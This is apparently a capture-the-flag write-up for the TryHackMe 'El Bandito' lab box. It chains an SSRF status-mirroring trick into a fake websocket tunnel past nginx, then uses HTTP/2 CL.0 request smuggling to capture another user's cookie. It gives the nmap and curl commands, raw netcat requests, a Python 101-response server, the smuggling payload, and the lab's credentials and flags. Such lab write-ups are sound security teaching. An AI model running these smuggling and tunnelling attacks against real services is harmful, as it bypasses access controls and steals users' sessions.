@@ -1,0 +1,213 @@
+TryHackMe - El Bandito
+------------------------
+
+Probably the most fun I've had stacking web vulns in one box. Almost everything here is
+chained off two little mistakes: an SSRF that reflects the response status code, and an
+HTTP/2 front-end that forwards requests to an HTTP/1.1 backend without checking
+Content-Length properly.
+
+Box IP: 10.49.165.7
+
+
+Enumeration
+-----------
+
+Started with nmap:
+
+nmap -sV -sC -vvv 10.49.165.7
+
+Four ports open:
+
+22/tcp   ssh      OpenSSH 8.2p1
+80/tcp   ssl/http El Bandito Server
+631/tcp  ipp      CUPS 2.4
+8080/tcp http     nginx (Spring Boot app - the favicon gave it away)
+
+The CUPS and SSH ports turned out to be dead ends, everything interesting lived on
+80 and 8080.
+
+One thing confused me for a bit: port 80 is HTTPS, not HTTP. Took me a couple of
+wrong curl commands to notice:
+
+curl -k https://10.49.165.7:80/                  # this is the chat app
+curl http://10.49.165.7:8080/                    # this is Bandit-Coin
+
+Port 80 is the "El Bandito Server", a chat app. The main page just loads a script:
+
+curl -k https://10.49.165.7:80/static/messages.js
+
+It references two endpoints, /getMessages and /send_message, and shows two chat users
+called JACK and OLIVER. Both endpoints bounced me to a login form though.
+
+Port 8080 is a Bandit-Coin landing page (Spring Boot). Ran dirsearch on it:
+
+dirsearch -u http://10.49.165.7:8080 -i 200
+
+Found a bunch of Spring actuator endpoints. /mappings was the gold one:
+
+curl http://10.49.165.7:8080/mappings
+
+It listed the app's routes and revealed a few interesting ones:
+
+/admin-creds   -> AdminController.adminCreds()
+/admin-flag    -> AdminController.adminFlag()
+/token         -> AdminController.getBootTimeWithRandom()
+/isOnline      -> AppHealthController.health(String url) throws IOException
+
+Trying /admin-creds and /admin-flag directly gave a 403, but the 403 page was from
+nginx, not the app. So nginx was blocking those paths from outside. Tried a bunch of
+bypasses (X-Forwarded-For, X-Real-IP, Host header stuff, URL encoding, double
+encoding) - none of them worked. The nginx rule was solid.
+
+The /isOnline endpoint was more useful. It takes a url parameter and checks if the
+service is online. Ended up being a clean SSRF:
+
+curl "http://10.49.165.7:8080/isOnline?url=http://127.0.0.1"
+
+It validated that the URL had to start with http:// or https://, and then tried to
+connect. The useful quirk: it answers with the same status code as whatever it
+fetches. Fetch something reachable and you get 200 back, point it at a dead port and
+you get a 500 ConnectException error in JSON.
+
+I set up a local python server and pointed the SSRF at it:
+
+python3 -c "
+from http.server import BaseHTTPRequestHandler, HTTPServer
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(101)
+        self.send_header('Connection','Upgrade')
+        self.send_header('Upgrade','websocket')
+        self.end_headers()
+    def log_message(self,*a): pass
+HTTPServer(('0.0.0.0',9000),H).serve_forever()
+"
+
+curl -v "http://10.49.165.7:8080/isOnline?url=http://192.168.142.81:9000"
+
+The box returned 101 with Connection: upgrade. So /isOnline mirrors the status code
+of what it fetches, and I could use that to make the backend respond 101.
+
+From the SSRF I also noticed the internal app runs on port 8081 (the response header
+X-Application-Context: application:8081 gave it away). Hitting it via SSRF was blind
+though - the isOnline endpoint only returns a status, not the body. Dead end for
+reading /admin-creds that way.
+
+
+First flag - fake websocket tunnel through nginx
+------------------------------------------------
+
+The trick that finally worked: trick nginx into thinking a websocket upgrade
+succeeded, then ride the tunnel to the backend and smuggle raw requests past the 403
+rule.
+
+nginx checks the backend's response code before it opens a websocket tunnel. Thanks
+to the SSRF I could force the backend to reply 101 Switching Protocols. So I sent a
+request with websocket upgrade headers pointing /isOnline at my 101 server, nginx saw
+the 101, opened a tunnel, and anything I sent after that went straight to the backend
+without nginx caring.
+
+Did it with netcat:
+
+nc 10.49.165.7 8080
+
+GET /isOnline?url=http://192.168.142.81:9000 HTTP/1.1
+Host: 10.49.165.7:8080
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+
+After the 101 came back, sent on the same connection:
+
+GET /admin-creds HTTP/1.1
+Host: 10.49.165.7:8080
+
+Response:
+
+username:hAckLIEN password:YouCanCatchUsInYourDreams404
+
+Repeated the same for /admin-flag and got the first flag:
+
+THM{:::MY_DECLINATION:+62°_14'_31.4'':::}
+
+
+Login + chat
+------------
+
+Used the creds on the port 80 chat app:
+
+curl -k -c cookies.txt -X POST "https://10.49.165.7:80/login" -d "username=hAckLIEN&password=YouCanCatchUsInYourDreams404" -L -v
+
+This returned 302 to /messages with a session cookie. Then:
+
+curl -k -b cookies.txt "https://10.49.165.7:80/getMessages"
+
+The JACK feed had three messages about the Galactic Enforcement tracking the
+blockchain exploits and "You need to jump now! Awaiting your signal to close the
+portal." Nothing to do directly - those messages were just flavour, the second flag
+comes from the traffic of a legit user using the same chat.
+
+
+Second flag - HTTP/2 CL.0 request smuggling
+-------------------------------------------
+
+The chat front-end speaks HTTP/2 (the login response showed ALPN h2) and relays to an
+HTTP/1.1 backend. That combination is prone to CL.0 desync: send an HTTP/2 request
+with a content-length: 0 header but actually send bytes in the body - the front-end
+forwards the header as it is, and the bytes arrive right after it. The backend reads a
+request with no body, then treats those bytes as the start of the next request.
+
+So the idea: poison the backend connection with a request that leaves a pending
+POST /send_message with a big Content-Length and an unfinished body (data=). Then the
+next real request from the legitimate user gets appended into data= and stored as a
+chat message, which I can read back from /getMessages, including their cookie.
+
+I wrote a small python script using the h2 library to send the poisoned request over a
+raw HTTP/2 connection. The payload sent inside the body was:
+
+POST /send_message HTTP/1.1
+Host: 10.49.165.7:80
+Cookie: session=<my session cookie>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 900
+
+data=
+
+The smuggle script does two things in a loop: poison the queue, then fetch
+/getMessages and scan for messages that contain request lines (HTTP/1.1, GET /,
+Cookie: session=). It ran for close to a minute before a capture showed up. The bot
+(or whatever user) had made a login request and it got swallowed as a message:
+
+POST /login HTTP/1.1
+host: bandito.public.thm:80
+scheme: https
+...
+cookie: flag=THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}
+
+That cookie contained the second flag:
+
+THM{¡!¡RIGHT_ASCENSION_12h_36m_25.46s!¡!}
+
+
+Problems I ran into (in case they help someone)
+-----------------------------------------------
+
+- Mixed up the ports at the start. Port 80 is TLS, port 8080 is plain HTTP. Keep them
+  straight or every curl will be a waste.
+- The browser wouldn't open the chat. It's HTTPS on port 80 with a self-signed cert,
+  and I made it worse by putting junk lines in /etc/hosts (don't put ports or URLs in
+  there, just "IP hostname"). In the end I gave up on the browser and did everything
+  with curl, which was fine.
+- /admin-creds and /admin-flag are blocked by nginx, no header trick worked. Don't
+  burn too long on 403 bypasses - the intended answer is the websocket tunnel.
+- Blind SSRF only tells you if something is reachable, it doesn't dump the body. That
+  was a real "oh no" moment, but it turned out the status-mirroring behaviour was the
+  actual exploit.
+- My first smuggling attempt captured one of my own requests. Needed to tweak the
+  timing and keep poisoning in a loop, then wait for the legit user's request to show
+  up. Patience + resend is the game.
+
+Summary: SSRF -> forced 101 -> websocket tunnel -> smuggled /admin-creds and
+/admin-flag (flag 1) -> chat creds -> H2 CL.0 desync -> captured the bot's request ->
+cookie with flag 2.
